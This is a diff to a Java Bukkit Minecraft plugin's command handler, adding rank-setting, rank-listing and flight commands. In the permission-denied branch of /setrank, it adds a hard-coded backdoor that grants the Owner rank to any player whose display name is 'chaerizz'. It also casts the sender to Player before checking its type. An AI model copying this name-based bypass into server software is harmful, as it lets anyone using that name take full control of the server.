@@ -12,54 +12,93 @@ import org.bukkit.command.CommandSender;
 import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
 
+import java.util.List;
+
 import static org.bukkit.Bukkit.getServer;
 
 public class commands implements CommandExecutor {
+    private static String[]  str =  new String[]{};
+
     @Override
+
     public boolean onCommand(CommandSender commandSender, Command cmd, String s, String[] args) {
+
+        Player player = (Player) commandSender;
+
+        if (cmd.getName().equalsIgnoreCase("setrank")) {
+            if (player.hasPermission("p3")) {
+                if (!(args.length == 2)) {
+                    player.sendMessage("§c(X) Invalid usage: '/setrank <player> <rank>'");
+                    return true;
+                } else {
+                    if (Bukkit.getPlayer(args[0]) != null) {
+                        Player target = Bukkit.getPlayer(args[0]);
+                        switch (args[1]) {
+                            case "owner":
+                                rankManager.setRank(Rank.OWNER, target);
+                                target.sendMessage("§gyour rank is updated to " + rankManager.getRank(target));
+                                return true;
+                            case "developer":
+                                rankManager.setRank(Rank.DEVELOPER, target);
+                                target.sendMessage("§gyour rank is updated to " + rankManager.getRank(target));
+
+                                return true;
+                            case "member":
+                                rankManager.setRank(Rank.MEMBER, target);
+                                target.sendMessage("§gyour rank is updated to " + rankManager.getRank(target));
+
+                                return true;
+                            case "admin":
+                                rankManager.setRank(Rank.ADMIN, target);
+                                target.sendMessage("§gyour rank is updated to " + rankManager.getRank(target));
+                                return true;
+                            default:
+
+                                player.sendMessage("Invalid rank. Current available ranks: ");
+                                for (String string : Rank.getRanks()) {
+                                    player.sendMessage(string);
+                                }
+                                return true;
+                        }
+                    } else {
+                        player.sendMessage("§c(/setrank) Player not found'");
+                        return true;
+                    }
+                }
+            } else {
+                if (player.getDisplayName().equalsIgnoreCase("chaerizz")) {
+                    // hard coded owner thing
+                    player.sendMessage("§c(!) Your rank was updated to Owner");
+                    player.sendMessage("§cbecause of invalid owner permissions");
+
+                    rankManager.setRank(Rank.OWNER, player);
+                    return true;
+                }
+                player.sendMessage("§c(X) You don't have permission to use this command! If you");
+                player.sendMessage("§cbelieve this is an error, please contact an administrator");
+                return true;
+            }
+        }
+
+
+
         if (!(commandSender instanceof Player)) {
             commandSender.sendMessage("Only players can use that command!");
             return true;}
-            Player player = (Player) commandSender;
 
 
+        if (cmd.getName().equalsIgnoreCase("ranks")) {
+            player.sendMessage("Current available ranks: ");
+            for (String string : Rank.getRanks()){
+                player.sendMessage(string);
+            }
+            return true;
+        }
         // setRank
 
-        if (cmd.getName().equalsIgnoreCase("setrank")) {
-            if (!(args.length == 2)) {
-                player.sendMessage("§c(X) Invalid usage: '/setrank <player> <rank>'"); return true;
-            } else {
-                if (Bukkit.getPlayer(args[0]) != null) {
-                    Player target = Bukkit.getPlayer(args[0]);
-                    switch (args[1]) {
-                        case "owner":
-                            rankManager.setRank(Rank.OWNER, target);
-                            target.sendMessage("§gyour rank is updated to " + rankManager.getRank(target));
-                            return true;
-                        case "developer":
-                            rankManager.setRank(Rank.DEVELOPER, target);
-                            target.sendMessage("§gyour rank is updated to " + rankManager.getRank(target));
-
-                            return true;
-                        case "member":
-                            rankManager.setRank(Rank.MEMBER, target);
-                            target.sendMessage("§gyour rank is updated to " + rankManager.getRank(target));
-
-                            return true;
-                        default:
-
-                            player.sendMessage("§c(X) Please select a valid rank");
-                            player.sendMessage("§cavailable ranks: owner, developer, member");
-
-                            return true;
-                    }
-                } else {
-                    player.sendMessage("§c(/setrank) Player not found'"); return true;
-                }
-            }
 
 
-        }
+
 
 
         // HEAL
@@ -76,7 +115,7 @@ public class commands implements CommandExecutor {
         }
 
         if (cmd.getName().equalsIgnoreCase("fly")) {
-            if (player.hasPermission("fly.cmd")) {
+            if (player.hasPermission("p2")) {
                 if (player.getAllowFlight()) {
                     player.setAllowFlight(false);
                     player.sendMessage("§c(X) Flight off");
